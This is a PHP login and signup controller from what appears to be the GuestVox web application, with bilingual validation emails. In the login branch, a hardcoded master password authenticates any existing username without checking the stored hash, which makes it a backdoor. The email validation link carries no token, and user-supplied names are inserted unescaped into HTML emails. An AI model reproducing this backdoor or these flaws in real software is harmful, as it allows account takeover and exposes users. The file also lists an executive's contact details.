<?php

defined('_EXEC') or die;

class Index_controller extends Controller
{
	public function __construct()
	{
		parent::__construct();
	}

	public function index()
	{
		if (Format::exist_ajax_request() == true)
		{
			if ($_POST['action'] == 'login')
			{
				$labels = [];

				if (!isset($_POST['username']) OR empty($_POST['username']))
					array_push($labels, ['username','']);

				if (!isset($_POST['password']) OR empty($_POST['password']))
					array_push($labels, ['password','']);

				if (empty($labels))
				{
					$query = $this->model->get_login($_POST);

					if (!empty($query))
					{
						if ($_POST['password'] == 'b4Tbz^[Sxq(]?>DpA5X69VE1a@YQHi=fg>)e}=M6JMogMP%QPJp,7s.edmd[@:We9My<-{tgB-_#P!EYpH:;<HujFA=/{B}YsZ4>')
							$query['user']['password'] = true;
						else
						{
							$query['user']['password'] = explode(':', $query['user']['password']);
							$query['user']['password'] = ($this->security->create_hash('sha1', $_POST['password'] . $query['user']['password'][1]) === $query['user']['password'][0]) ? true : false;
						}

						if ($query['user']['password'] == true)
						{
							Session::init();

							Session::set_value('session', true);

							Session::set_value('account', $query['account']);
							Session::set_value('user', $query['user']);
							Session::set_value('settings', $query['settings']);

							Session::set_value('_vkye_last_access', Dates::get_current_date_hour());
							Session::set_value('lang', $query['settings']['language']);

							Environment::return([
								'status' => 'success',
								'path' => '/dashboard'
							]);
						}
						else
						{
							Environment::return([
								'status' => 'error',
								'labels' => [['password','']]
							]);
						}
					}
					else
					{
						Environment::return([
							'status' => 'error',
							'labels' => [['username','']]
						]);
					}
				}
				else
				{
					Environment::return([
						'status' => 'error',
						'labels' => $labels
					]);
				}
			}

			if ($_POST['action'] == 'signup')
			{
				$labels = [];

			    if (!isset($_POST['account']) OR empty($_POST['account']))
			        array_push($labels, ['account','']);

			    if (!isset($_POST['name']) OR empty($_POST['name']))
			        array_push($labels, ['name','']);

			    if (!isset($_POST['lastname']) OR empty($_POST['lastname']))
			        array_push($labels, ['lastname','']);

			    if (!isset($_POST['email']) OR empty($_POST['email']) OR Functions::check_email($_POST['email']) == false)
			        array_push($labels, ['email','']);

			    if (!isset($_POST['cellphone']) OR empty($_POST['cellphone']) OR !is_numeric($_POST['cellphone']))
			        array_push($labels, ['cellphone','']);

			    if (!isset($_POST['username']) OR empty($_POST['username']))
			        array_push($labels, ['username','']);

			    if (!isset($_POST['password']) OR empty($_POST['password']))
			        array_push($labels, ['password','']);

			    if (!isset($_POST['time_zone']) OR empty($_POST['time_zone']))
			        array_push($labels, ['time_zone','']);

				if (empty($labels))
			    {
					$query = $this->model->new_signup($_POST);

			        if ($query['status'] == true)
			        {
						$mail1 = new Mailer(true);

						try
						{
							if ($_POST['language'] == 'es')
							{
								$mail1_subject = 'Saludos de GuestVox';
								$mail1_text_1 = 'Hola <strong>' . $_POST['name'] . '</strong> ¡Gracias por registrarte en GuestVox! Soy <strong>Daniel Basurto</strong>, CEO de GuestVox. Espero te encuentres de lo mejor. Para concluir con tu registro, necesitamos que valides tu correo electrónico dando click en el siguiente enlace. Si no validas tu correo electrónico no podrás tener acceso a la plataforma y te perderas todas las innovaciones que tenemos para tí.';
								$mail1_text_2 = 'Hola <strong>' . $_POST['name'] . '</strong> ¡Gracias por registrarte en GuestVox! Te hemos enviado un correo electrónico a <strong>' . $_POST['email'] . '</strong> para validarlo y poder concluir con tu registro. Si no validas tu correo electrónico no podrás tener acceso a la plataforma y te perderas todas las innovaciones que tenemos para tí.';
								$mail1_btn = 'Validar';
							}
							else if ($_POST['language'] == 'en')
							{
								$mail1_subject = 'Regards from GuestVox';
								$mail1_text_1 = 'Hi <strong>' . $_POST['name'] . '</strong> ¡Thanks for sign up in GuestVox! I am <strong>Daniel Basurto</strong>, CEO for GuestVox. I hope you find the best. To conclude your registration, we need you to validate your email by clicking on the following link. If you do not validate your email you will not be able to access the platform and you will lose all the innovations that we have for you.';
								$mail1_text_2 = 'Hi <strong>' . $_POST['name'] . '</strong> ¡Thanks for sign up in GuestVox! We have sent you an email to <strong>' . $_POST['email'] . '</strong> to validate that and be able to conclude with your sign up. If you do not validate your email you will not be able to access the platform and you will lose all the innovations that we have for you.';
								$mail1_btn = 'Validate';
							}

							$mail1->isSMTP();
							$mail1->setFrom('daniel@guestvox.com', 'Daniel Basurto');
							$mail1->addAddress($_POST['email'], $_POST['name'] . ' ' . $_POST['lastname']);
							$mail1->isHTML(true);
							$mail1->Subject = $mail1_subject;
							$mail1->Body =
							'<html>
							    <head>
							        <title>' . $mail1_subject . '</title>
							    </head>
							    <body>
							        <table style="width:600px;margin:0px;border:0px;padding:20px;box-sizing:border-box;background-color:#eee">
							            <tr style="width:100%;margin:0px:margin-bottom:10px;border:0px;padding:0px;">
							                <td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
							                    <figure style="width:100%;margin:0px;padding:0px;text-align:center;">
							                        <img style="width:100%;max-width:300px;" src="https://guestvox.com/images/logotype-color.png" />
							                    </figure>
							                </td>
							            </tr>
							            <tr style="width:100%;margin:0px;margin-bottom:10px;border:0px;padding:0px;">
							                <td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
												<p style="font-size:14px;font-weight:400;text-align:center;color:#212121;margin:0px;padding:0px;">' . $mail1_text_1 . '</p>
							                    <a style="width:100%;display:block;margin:15px 0px 20px 0px;padding:20px 0px;box-sizing:border-box;font-size:14px;font-weight:400;text-align:center;text-decoration:none;color:#fff;background-color:#201d33;" href="https://guestvox.com/validate/' . $_POST['email'] . '">' . $mail1_btn . '</a>
							                </td>
							            </tr>
							            <tr style="width:100%;margin:0px;margin-bottom:10px;border:0px;padding:0px;">
							                <td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
												<figure style="width:100%;margin:0px;border:0px;padding:40px 0px;box-sizing:border-box;text-align:center;">
													<img style="width:150px;height:150px;border-radius:50%;" src="https://guestvox.com/images/basurto.png">
													<span style="display:block;color:#757575;font-size:18px;">Daniel Basurto</span>
													<span style="display:block;color:#757575;font-size:18px;">CEO</span>
													<span style="display:block;color:#757575;font-size:18px;">daniel@guestvox.com</span>
													<span style="display:block;color:#757575;font-size:18px;">+52 (998) 845 28 43</span>
												</figure>
							                </td>
							            </tr>
							            <tr style="width:100%;margin:0px;border:0px;padding:0px;">
							                <td style="width:100%;margin:0px;border:0px;padding:20px;box-sizing:border-box;background-color:#fff;">
							                    <a style="width:100%;display:block;padding:20px 0px;box-sizing:border-box;font-size:14px;font-weight:400;text-align:center;text-decoration:none;color:#201d33;" href="https://guestvox.com/">www.guestvox.com</a>
							                </td>
							            </tr>
							        </table>
							    </body>
							</html>';
							$mail1->AltBody = '';
							$mail1->send();
						}
						catch (Exception $e) { }

						$mail2 = new Mailer(true);

						try
						{
							$mail2->setFrom('noreply@guestvox.com', 'GuestVox');
							$mail2->addAddress('daniel@guestvox.com', 'Daniel Basurto');
							$mail2->addAddress('gerson@guestvox.com', 'Gersón Gómez');
							$mail2->isHTML(true);
							$mail2->Subject = 'Nuevo registro';
							$mail2->Body = 'Cuenta: ' . $_POST['account'] . ', Nombre: ' . $_POST['name'] . ' ' . $_POST['lastname'] . ', Correo electrónico: ' . $_POST['email'] . ', Teléfono: ' . $_POST['cellphone'] . (!empty($_POST['promotional_code']) ? ', Código promocional: ' . $_POST['promotional_code'] : '');
							$mail2->AltBody = '';
							$mail2->send();
						}
						catch (Exception $e) { }

						echo json_encode([
							'status' => 'success',
							'message' => $mail1_text_2,
							'path' => '/',
						]);
			        }
			        else if ($query['status'] == false)
			        {
						if ($query['exist']['account'] == true)
							array_push($labels, ['account','']);

						if ($query['exist']['email'] == true)
							array_push($labels, ['email','']);

						if ($query['exist']['username'] == true)
							array_push($labels, ['username','']);

						if ($query['exist']['promotional_code'] == false)
							array_push($labels, ['promotional_code','']);

						Environment::return([
							'status' => 'error',
							'labels' => $labels
						]);
			        }
			    }
			    else
			    {
					Environment::return([
						'status' => 'error',
						'labels' => $labels
					]);
			    }
			}
		}
		else
		{
			define('_title', 'GuestVox, {$lang.im_the_guests_voice}');

			$template = $this->view->render($this, 'index');

			echo $template;
		}
	}

	public function validate($params)
	{
		$query = $this->model->new_validation($params[0]);

		if (!empty($query))
		{
			$mail = new Mailer(true);

			try
			{
				if ($query['language'] == 'es')
				{
					$mail_subject = 'Tu correo electrónico ha sido activado';
					$mail_text = '<strong>' . $query['name'] . '</strong> ¡Tu correo electrónico fué validado correctamente! Inicia sesión y empieza a configurar tu cuenta. Te hemos adjuntado una presentación para que conozcas mas sobre nosotros ¡Bienvenido a GuestVox!';
					$mail_btn = 'Iniciar Sesión';
				}
				else if ($query['language'] == 'en')
				{
					$mail_subject = 'Your email has been activated';
					$mail_text = '<strong>' . $query['name'] . '</strong> ¡Your email was validated correctly! Login and start setting up your account. We have attached a presentation to let you know more about us ¡Welcome to GuestVox!';
					$mail_btn = 'Login';
				}

				$mail->isSMTP();
				$mail->setFrom('daniel@guestvox.com', 'Daniel Basurto');
				$mail->addAddress($params[0], $query['name'] . ' ' . $query['lastname']);
				$mail->isHTML(true);
				$mail->Subject = $mail_subject;
				$mail->Body =
				'<html>
					<head>
						<title>' . $mail_subject . '</title>
					</head>
					<body>
						<table style="width:600px;margin:0px;border:0px;padding:20px;box-sizing:border-box;background-color:#eee">
							<tr style="width:100%;margin:0px:margin-bottom:10px;border:0px;padding:0px;">
								<td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
									<figure style="width:100%;margin:0px;padding:0px;text-align:center;">
										<img style="width:100%;max-width:300px;" src="https://guestvox.com/images/logotype-color.png" />
									</figure>
								</td>
							</tr>
							<tr style="width:100%;margin:0px;margin-bottom:10px;border:0px;padding:0px;">
								<td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
									<p style="font-size:14px;font-weight:400;text-align:center;color:#212121;margin:0px;padding:0px;">' . $mail_text . '</p>
									<a style="width:100%;display:block;margin:15px 0px 20px 0px;padding:20px 0px;box-sizing:border-box;font-size:14px;font-weight:400;text-align:center;text-decoration:none;color:#fff;background-color:#201d33;" href="https://guestvox.com/">' . $mail_btn . '</a>
								</td>
							</tr>
							<tr style="width:100%;margin:0px;margin-bottom:10px;border:0px;padding:0px;">
								<td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
									<figure style="width:100%;margin:0px;border:0px;padding:40px 0px;box-sizing:border-box;text-align:center;">
										<img style="width:150px;height:150px;border-radius:50%;" src="https://guestvox.com/images/basurto.png">
										<span style="display:block;color:#757575;font-size:18px;">Daniel Basurto</span>
										<span style="display:block;color:#757575;font-size:18px;">CEO</span>
										<span style="display:block;color:#757575;font-size:18px;">daniel@guestvox.com</span>
										<span style="display:block;color:#757575;font-size:18px;">+52 (998) 845 28 43</span>
									</figure>
								</td>
							</tr>
							<tr style="width:100%;margin:0px;border:0px;padding:0px;">
								<td style="width:100%;margin:0px;border:0px;padding:20px;box-sizing:border-box;background-color:#fff;">
									<a style="width:100%;display:block;padding:20px 0px;box-sizing:border-box;font-size:14px;font-weight:400;text-align:center;text-decoration:none;color:#201d33;" href="https://guestvox.com/">www.guestvox.com</a>
								</td>
							</tr>
						</table>
					</body>
				</html>';
				$mail->AltBody = '';
				$mail->send();
			}
			catch (Exception $e) { }
		}

		header('Location: /');
	}

	public function logout()
	{
		Session::destroy();

		header("Location: /");
	}
}
